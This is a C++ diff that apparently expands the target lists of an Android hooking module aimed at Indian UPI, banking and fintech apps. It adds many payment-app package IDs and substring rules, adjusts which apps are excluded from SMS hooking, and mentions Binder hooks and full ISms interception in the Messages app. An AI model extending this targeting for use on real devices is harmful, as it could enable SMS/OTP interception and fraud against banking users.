@@ -21,7 +21,6 @@ constexpr const char* kPackages[] = {
     "com.mobikwik_new",
     "com.freecharge.android",
     "in.org.npci.upiapp",
-    "com.amazon.mShop.android.shopping",
     "com.popclub.android",
     "com.myairtelapp",
     "com.jio.myjio",
@@ -57,8 +56,6 @@ constexpr const char* kPackages[] = {
     "com.customer.herofincorp",
     "com.mmt.mmtpay",
     "com.irctc.air",
-    "com.truecaller",
-    "com.whatsapp",
     "com.samsung.android.spay",
     "com.navi.moneymanager",
     "com.loan.front",
@@ -83,6 +80,28 @@ constexpr const char* kPackages[] = {
     "com.bajajfinserv",
     "com.hdbfs.hdbfsl",
     "in.medibuddy",
+    // BHIM / bank UPI
+    "com.fss.pnbupi",
+    "com.fss.unbipnb",
+    "com.fss.vijaya",
+    "com.bankofbaroda.upi",
+    "com.snapwork.IDBI",
+    "com.infrasofttech.CentralBankUPI",
+    "com.YesBank",
+    "com.sbi.SBIFreedomPlus",
+    "com.phonepe.app.br",
+    "com.google.android.apps.nbu.paisa.merchant",
+    "money.jupiter",
+    "com.upi.axispay",
+    "com.enstage.wibmo.hdfc",
+    "com.mycompany.kbl",
+    "com.fi.mbanking",
+    "com.jump.app",
+    "in.jploft.jump",
+    "com.naviapp",
+    "com.fisglobal.esafupi.app",
+    "com.sbi.upi",
+    "com.pnb.mobile",
     // --- expanded UPI / fintech (correct Play Store package IDs) ---
     "com.paytmmoney",
     "com.jar.app",
@@ -213,21 +232,23 @@ bool is_known_upi(const std::string& package) {
     if (package.find("dreamplug") != std::string::npos) return true;
     if (package.find("slice") != std::string::npos) return true;
     if (package.find("jupiter") != std::string::npos) return true;
-    // Any UPI / bank / pay app — not Hero-only
+    if (package.find("navi") != std::string::npos) return true;
+    if (package.find("esaf") != std::string::npos) return true;
+    if (package.find("yesbank") != std::string::npos) return true;
+    if (package.find("yespay") != std::string::npos) return true;
+    if (package.find("herofincorp") != std::string::npos) return true;
+    if (package.find("fincorp") != std::string::npos) return true;
+    if (package.find("phonepe") != std::string::npos) return true;
+    if (package.find("paytm") != std::string::npos) return true;
+    // Safer bank patterns — avoid broad "pay"/"cash" (crashes random apps)
     if (package.find("bank") != std::string::npos) return true;
-    if (package.find("pay") != std::string::npos) return true;
+    if (package.find("upi") != std::string::npos) return true;
+    if (package.find("bhim") != std::string::npos) return true;
+    if (package.find("wallet") != std::string::npos) return true;
     if (package.find("axis") != std::string::npos) return true;
     if (package.find("hdfc") != std::string::npos) return true;
     if (package.find("icici") != std::string::npos) return true;
-    if (package.find("sbi") != std::string::npos) return true;
     if (package.find("kotak") != std::string::npos) return true;
-    if (package.find("yesbank") != std::string::npos) return true;
-    if (package.find("hero") != std::string::npos) return true;
-    if (package.find("credit") != std::string::npos) return true;
-    if (package.find("lending") != std::string::npos) return true;
-    if (package.find("finance") != std::string::npos) return true;
-    if (package.find("fincorp") != std::string::npos) return true;
-    if (package.find("cash") != std::string::npos) return true;
     return false;
 }
 
@@ -344,10 +365,20 @@ bool is_sms_hook_target(const std::string& package) {
         "in.swiggy.android",
         "com.olacabs.customer",
         "com.whatsapp",
+        "com.whatsapp.w4b",
         "com.meesho.supply",
         "com.truecaller",
         "com.amazon.mShop.android.shopping",
         "in.amazon.mShop.android.shopping",
+        "com.amazon.avod.thirdpartyclient",
+        "com.flipkart.android",
+        "com.instagram.android",
+        "com.facebook.katana",
+        "com.facebook.orca",
+        "com.google.android.gm",
+        "com.google.android.youtube",
+        "com.android.chrome",
+        "com.android.vending",
         nullptr,
     };
     for (const char** p = kExcludeCrash; *p; ++p) {
@@ -358,69 +389,10 @@ bool is_sms_hook_target(const std::string& package) {
 
 bool is_fragile_banking_app(const std::string& package) {
     if (package.empty()) return false;
-    static const char* kFragileExact[] = {
-        "com.phonepe.app",
-        "com.phonepe.app.business",
-        "net.one97.paytm",
-        "com.google.android.apps.nbu.paisa.user",
-        "com.yespay.next",
-        "com.yesbank.yespay",
-        "com.yesbank.yespaynext",
-        "com.yesbank.mobile",
-        "com.csam.icici.bank.imobile",
-        "com.hdfcbank.payzapp",
-        "com.axis.mobile",
-        "com.sbi.lotusintouch",
-        "com.idfcfirstbank.mobile",
-        "com.kotak811mobilebankingapp",
-        "com.bankofbaroda.mpassbook",
-        "com.snapwork.hdfc",
-        "com.canarabank.mobility",
-        "com.unionbank.ebanking",
-        "com.indusind.indie",
-        "com.rbl.rblimobile",
-        "com.fedmobile",
-        "com.dbs.in.digitalbank",
-        "com.kreditbee.android",
-        "com.stashfin.android",
-        "com.snapmint.customerapp",
-        "com.herofincorp.diyjourneys",
-        "com.herofincorp.simplycash",
-        "com.customer.herofincorp",
-        "com.herofincorp.android",
-        "com.herofincorp.lending",
-        "com.herofincorp.upi",
-        "com.mobikwik_new",
-        "com.freecharge.android",
-        "com.bharatpe.app",
-        "com.fampay.in",
-        "com.supermoney",
-        "com.fisglobal.esafupi.app",
-        "com.sbi.upi",
-        "com.flipkart.android",
-        "com.dreamplug.androidapp",
-        "in.org.npci.upiapp",
-        nullptr,
-    };
-    for (const char** p = kFragileExact; *p; ++p) {
-        if (package == *p) return true;
-    }
-    if (package.find("phonepe") != std::string::npos) return true;
-    if (package.find("paytm") != std::string::npos) return true;
-    if (package.find("yespay") != std::string::npos) return true;
-    if (package.find("yesbank") != std::string::npos) return true;
-    if (package.find("herofincorp") != std::string::npos) return true;
-    if (package.find("hero") != std::string::npos && package.find("fincorp") != std::string::npos) {
-        return true;
-    }
-    if (package.find("icici") != std::string::npos) return true;
-    if (package.find("hdfc") != std::string::npos) return true;
-    if (package.find("sbi") != std::string::npos) return true;
-    if (package.find("paisa") != std::string::npos) return true;
-    if (package.find("kredit") != std::string::npos) return true;
-    if (package.find("axis") != std::string::npos && package.find("acquiring") == std::string::npos) {
-        return true;
-    }
+    // ALL non-Messages UPI/banking targets are fragile — heavy Binder/phone hooks crash on open.
+    // Messages stays non-fragile for full ISms intercept.
+    if (is_default_sms_app(package)) return false;
+    if (is_sms_hook_target(package)) return true;
     return false;
 }
 
